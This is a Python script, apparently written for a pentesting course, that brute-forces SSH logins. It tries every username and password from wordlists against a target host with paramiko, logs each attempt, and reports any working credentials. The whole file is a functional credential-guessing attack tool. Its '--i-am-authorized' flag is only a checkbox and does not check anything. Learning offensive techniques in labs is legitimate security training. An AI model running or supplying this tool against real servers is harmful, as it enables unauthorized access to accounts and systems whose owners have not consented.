#!/usr/bin/env python3
# ssh_bruteforce.py
# Simple SSH login brute forcer using a wordlist. Made for my pentesting
# course exercise - only run this on stuff you own (lab VM etc).

import argparse
import logging
import socket
import sys
import time
from pathlib import Path

try:
    import paramiko
except ImportError:
    print("Need paramiko installed: pip install paramiko", file=sys.stderr)
    sys.exit(1)


def setup_logging(log_file):
    logger = logging.getLogger("ssh_bruteforce")
    logger.setLevel(logging.INFO)
    fmt = logging.Formatter("%(asctime)s [%(levelname)s] %(message)s", datefmt="%H:%M:%S")

    sh = logging.StreamHandler(sys.stdout)
    sh.setFormatter(fmt)
    logger.addHandler(sh)

    fh = logging.FileHandler(log_file)
    fh.setFormatter(fmt)
    logger.addHandler(fh)

    return logger


def load_lines(path):
    p = Path(path)
    if not p.is_file():
        raise FileNotFoundError(f"File not found: {path}")

    lines = []
    with p.open("r", encoding="utf-8", errors="ignore") as f:
        for line in f:
            line = line.strip()
            if line and not line.startswith("#"):
                lines.append(line)
    return lines


def try_login(host, port, username, password, timeout):
    client = paramiko.SSHClient()
    client.set_missing_host_key_policy(paramiko.AutoAddPolicy())
    try:
        client.connect(
            hostname=host,
            port=port,
            username=username,
            password=password,
            timeout=timeout,
            banner_timeout=timeout,
            auth_timeout=timeout,
            allow_agent=False,
            look_for_keys=False,
        )
        return True
    except paramiko.AuthenticationException:
        return False
    finally:
        client.close()


def brute_force(host, port, usernames, passwords, delay, timeout, stop_on_success, logger):
    hits = []
    total = len(usernames) * len(passwords)
    attempt = 0

    logger.info(f"starting against {host}:{port} - {len(usernames)} users x {len(passwords)} passwords = {total} tries")

    for username in usernames:
        for password in passwords:
            attempt += 1
            logger.info(f"[{attempt}/{total}] {username}:{password}")

            try:
                ok = try_login(host, port, username, password, timeout)
            except (socket.timeout, socket.error, paramiko.SSHException) as e:
                logger.warning(f"connection error on {username}:{password} - {e}")
                time.sleep(delay)
                continue

            if ok:
                logger.info(f"[+] got it -> {username}:{password}")
                hits.append((username, password))
                if stop_on_success:
                    return hits
            else:
                logger.debug(f"[-] nope {username}:{password}")

            time.sleep(delay)  # don't hammer the target too hard

    return hits


def parse_args():
    parser = argparse.ArgumentParser(description="SSH login brute forcer - lab/CTF use only")
    parser.add_argument("--host", required=True, help="target host/ip")
    parser.add_argument("--port", type=int, default=22, help="ssh port (default 22)")

    ug = parser.add_mutually_exclusive_group(required=True)
    ug.add_argument("--user", help="single username")
    ug.add_argument("--userlist", help="file with usernames, one per line")

    parser.add_argument("--wordlist", required=True, help="password list file")
    parser.add_argument("--delay", type=float, default=1.0, help="delay between attempts in seconds")
    parser.add_argument("--timeout", type=float, default=5.0, help="connection timeout")
    parser.add_argument("--no-stop-on-success", action="store_true", help="don't stop after finding a valid login")
    parser.add_argument("--log-file", default="bruteforce.log", help="log file path")
    parser.add_argument("--i-am-authorized", action="store_true", required=True,
                         help="confirms you're allowed to test this target")

    return parser.parse_args()


def main():
    args = parse_args()
    logger = setup_logging(args.log_file)

    usernames = [args.user] if args.user else load_lines(args.userlist)
    passwords = load_lines(args.wordlist)

    try:
        hits = brute_force(
            args.host, args.port, usernames, passwords,
            args.delay, args.timeout, not args.no_stop_on_success, logger,
        )
    except KeyboardInterrupt:
        logger.info("interrupted, exiting")
        sys.exit(130)

    print("\n" + "=" * 40)
    if hits:
        print(f"found {len(hits)} working login(s):")
        for u, p in hits:
            print(f"  {u} : {p}")
    else:
        print("no valid logins found")
    print("=" * 40)


if __name__ == "__main__":
    main()
